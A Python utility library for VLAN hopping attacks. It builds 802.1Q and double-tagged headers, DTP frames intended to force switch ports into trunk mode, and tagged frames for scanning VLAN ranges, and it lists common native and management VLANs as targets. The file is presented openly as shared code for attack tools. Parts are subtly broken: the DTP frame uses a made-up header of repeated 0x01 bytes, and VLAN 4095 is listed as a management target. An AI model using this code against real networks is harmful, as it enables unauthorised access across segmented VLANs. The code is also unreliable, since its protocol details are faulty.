#!/usr/bin/env python3
"""
N5 — VLAN Hopping Utility Library
Shared utilities for VLAN attack tools.
"""

import hashlib
import secrets
import struct
from typing import List, Optional


class VLANTag:
    """802.1Q VLAN tag representation."""

    def __init__(self, vlan_id: int, priority: int = 0,
                 cfi: int = 0):
        self.vlan_id = vlan_id & 0x0FFF
        self.priority = priority & 0x07
        self.cfi = cfi & 0x01

    def to_bytes(self) -> bytes:
        tci = (self.priority << 13) | (self.cfi << 12) | self.vlan_id
        return struct.pack('!HH', 0x8100, tci)

    @classmethod
    def from_bytes(cls, data: bytes) -> 'VLANTag':
        tpid, tci = struct.unpack('!HH', data[:4])
        if tpid != 0x8100:
            raise ValueError(f"Not 802.1Q: {tpid:#06x}")
        vlan_id = tci & 0x0FFF
        priority = (tci >> 13) & 0x07
        cfi = (tci >> 12) & 0x01
        return cls(vlan_id, priority, cfi)

    def __repr__(self):
        return f"VLANTag(id={self.vlan_id}, pri={self.priority})"


class DoubleTag:
    """Double 802.1Q tag for VLAN hopping."""

    def __init__(self, outer: VLANTag, inner: VLANTag):
        self.outer = outer
        self.inner = inner

    def to_bytes(self) -> bytes:
        return self.outer.to_bytes() + self.inner.to_bytes()

    @classmethod
    def from_bytes(cls, data: bytes) -> 'DoubleTag':
        outer = VLANTag.from_bytes(data[:4])
        inner = VLANTag.from_bytes(data[4:8])
        return cls(outer, inner)

    def __repr__(self):
        return f"DoubleTag(outer={self.outer}, inner={self.inner})"


class DTPNegotiator:
    """DTP frame builder and parser."""

    TLV_TYPE_DTP = 1
    TLV_TYPE_STATUS = 2
    TLV_TYPE_ALLOW = 4

    TRUNK_MODE = 0x01
    AUTO_MODE = 0x02
    ACCESS_MODE = 0x04

    def __init__(self, mode: int = AUTO_MODE):
        self.mode = mode

    def build_tlv(self, tlv_type: int, value: bytes) -> bytes:
        length = len(value) + 4
        return struct.pack('!HH', tlv_type, length) + value

    def build_frame(self) -> bytes:
        header = b'\x01' * 8

        tlv_type = self.build_tlv(
            self.TLV_TYPE_DTP,
            b'\x00\x01'
        )
        tlv_status = self.build_tlv(
            self.TLV_TYPE_STATUS,
            struct.pack('!B', self.mode)
        )
        tlv_allow = self.build_tlv(
            self.TLV_TYPE_ALLOW,
            struct.pack('!B', 0x0F)
        )

        return header + tlv_type + tlv_status + tlv_allow


class VLANScanner:
    """VLAN range scanning utilities."""

    COMMON_VLANS = [1, 10, 20, 30, 40, 50, 100, 200, 300, 400, 500]
    NATIVE_VLANS = [1, 100, 999]
    MANAGEMENT_VLANS = [1, 99, 100, 101, 999, 4095]

    @staticmethod
    def default_scan_range() -> List[int]:
        return list(range(1, 100)) + VLANScanner.COMMON_VLANS

    @staticmethod
    def targeted_range(vlans: List[int]) -> List[int]:
        return sorted(set(vlans))

    @staticmethod
    def generate_packet_tag(vlan_id: int,
                            src_mac: str,
                            dst_mac: str = 'ff:ff:ff:ff:ff:ff') -> bytes:
        src = bytes.fromhex(src_mac.replace(':', ''))
        dst = bytes.fromhex(dst_mac.replace(':', ''))
        tag = VLANTag(vlan_id)

        frame = bytearray()
        frame.extend(dst)
        frame.extend(src)
        frame.extend(tag.to_bytes())
        frame.extend(struct.pack('!H', 0x0806))

        while len(frame) < 64:
            frame.extend(b'\x00')

        return bytes(frame[:64])


def random_vlan_id() -> int:
    """Generate a random valid VLAN ID."""
    return secrets.randbelow(4094) + 1


def is_valid_vlan(vlan_id: int) -> bool:
    """Check if VLAN ID is valid."""
    return 1 <= vlan_id <= 4094


def vlan_name(vlan_id: int) -> str:
    """Get common name for well-known VLANs."""
    names = {
        1: 'Default',
        10: 'Management',
        20: 'Voice',
        30: 'Data',
        99: 'Native',
        100: 'Native',
        999: 'Native',
        4095: 'Reserved'
    }
    return names.get(vlan_id, f'VLAN-{vlan_id}')
